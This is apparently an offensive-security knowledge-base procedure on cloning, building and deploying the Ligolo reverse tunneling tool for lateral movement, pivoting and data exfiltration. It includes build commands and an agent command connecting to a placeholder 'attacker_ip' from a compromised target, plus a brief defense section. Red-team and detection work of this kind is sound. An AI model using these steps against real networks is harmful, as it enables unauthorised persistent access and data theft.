---
id: a393151c-a873-42d0-80fe-f683327ead9f
name: setup-ligolo-for-reverse-tunneling
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:22.799630+00:00'
updated_at: '2023-04-10T20:25:12.821529+00:00'
tactics:
  - '[[Lateral Movement]]'
techniques:
  - '[[Protocol Tunneling]]'
sub_techniques: []
tags:
  - '[[tags/Ligolo]]'
  - '[[tags/Network Pivoting Techniques]]'
  - reverse-tunneling
  - lateral-movement
commands:
  - '[[commands/ligolo-clone-and-install-dependencies]]'
  - '[[commands/ligolo-generate-tls-certificates]]'
  - '[[commands/ligolo-build-binaries]]'
platforms:
  - Linux
tools:
  - '[[tools/ligolo]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# Setup Ligolo for Reverse Tunneling

## Summary

This procedure outlines the steps to install, configure, and build Ligolo, an open-source reverse tunneling tool used for network pivoting, lateral movement, and data exfiltration in post-exploitation scenarios. By establishing encrypted reverse tunnels from compromised hosts to the attacker's infrastructure, it enables bypassing firewalls and accessing internal network resources.

## Description

Ligolo is a lightweight tunneling proxy written in Go that facilitates reverse connections over protocols like TCP, UDP, and SOCKS5, with support for TLS encryption to evade detection. It is particularly useful in red team engagements for maintaining access to segmented networks, proxying traffic through compromised hosts, and enabling command-and-control (C2) communications. The setup involves cloning the repository, installing Go dependencies, generating TLS certificates for secure communication, and compiling platform-specific binaries for both the proxy server (on the attacker's machine) and the agent (deployed on the target). This procedure assumes execution on a Linux-based attacker machine with Go installed and focuses on the build process; deployment on targets requires additional steps like transferring the agent binary.

## Requirements

1. Linux environment (e.g., Kali or Ubuntu) with Go 1.16+ installed and GOPATH configured.
2. Git installed for repository cloning.
3. Make utility available for building.
4. Administrative privileges on the attacker machine for certificate generation and binary compilation.
5. Network access to GitHub for cloning the repository.

## Defense

Defensive measures and detection strategies:

- Monitor for unusual outbound connections to attacker-controlled domains or IPs, especially over TLS on non-standard ports.
- Implement application whitelisting and behavior-based detection for Go binaries or tunneling tools on endpoints.
- Use network segmentation and proxy inspection to block unauthorized reverse connections; enable logging for SSH-like or SOCKS traffic.
- Deploy endpoint detection and response (EDR) tools to flag binary downloads, compilations, or executions of unsigned Go agents.

## Objectives

1. Prepare Ligolo binaries for deployment in a tunneling attack to enable lateral movement.
2. Establish encrypted reverse tunnels for persistent access and traffic pivoting.
3. Facilitate data exfiltration or internal reconnaissance without direct inbound access to the target network.

## Instructions

### Step 1: Clone Repository and Install Dependencies

**Context**: Begin by downloading the Ligolo source code and resolving its Go module dependencies to prepare the build environment. This step ensures all required libraries are available locally.

**Command** ([[commands/ligolo-clone-and-install-dependencies]]):
```bash
cd `go env GOPATH`/src
git clone https://github.com/sysdream/ligolo
cd ligolo
make dep
```

> This multi-line command navigates to the GOPATH source directory, clones the Ligolo repository, enters the directory, and installs dependencies using Make. Expected output includes Git clone progress (e.g., "Cloning into 'ligolo'...") and dependency resolution messages like "go: downloading github.com/...". Verify success by checking that the 'ligolo' directory exists and contains Go modules.

### Step 2: Generate Self-Signed TLS Certificates

**Context**: Create TLS certificates to encrypt tunnel communications, preventing interception and adding a layer of obfuscation. The TLS_HOST parameter should be set to a domain or IP resolvable by the target agent.

**Command** ([[commands/ligolo-generate-tls-certificates]]):
```bash
make certs TLS_HOST=example.com
```

> Run this from the ligolo directory to generate server.key and server.crt files in the 'certs' subdirectory. Expected output includes OpenSSL commands like "Generating a RSA private key..." and confirmation of certificate creation. Success is indicated by the presence of cert files; replace 'example.com' with your control server's hostname.

### Step 3: Build Binaries

**Context**: Compile the Ligolo proxy and agent binaries for the target platforms. This produces executable files ready for deployment, supporting cross-compilation for Windows, Linux, etc.

**Command** ([[commands/ligolo-build-binaries]]):
```bash
make build-all
```

> Executed in the ligolo directory, this builds all binaries (e.g., proxy, agent for multiple OS/arch). Expected output shows Go build progress like "go build -o bin/proxy ..." and lists generated files in the 'bin' directory. Verify by listing 'bin/' contents, which should include proxy and agent executables.

### Step 4: Verify Setup and Prepare for Deployment

**Context**: Test the built binaries locally and prepare the agent for transfer to the target. This ensures functionality before operational use.

**Command** (no specific command; use built binaries):

> Run the proxy with `./bin/proxy -selfcert -listen 11601` on the attacker machine and test agent connection simulation. Expected output for proxy: "Proxy listening on :11601". For deployment, transfer the agent binary (e.g., via SCP or existing access) to the target and execute it with `./agent -connect attacker_ip:11601 -server attacker_ip:11601`.
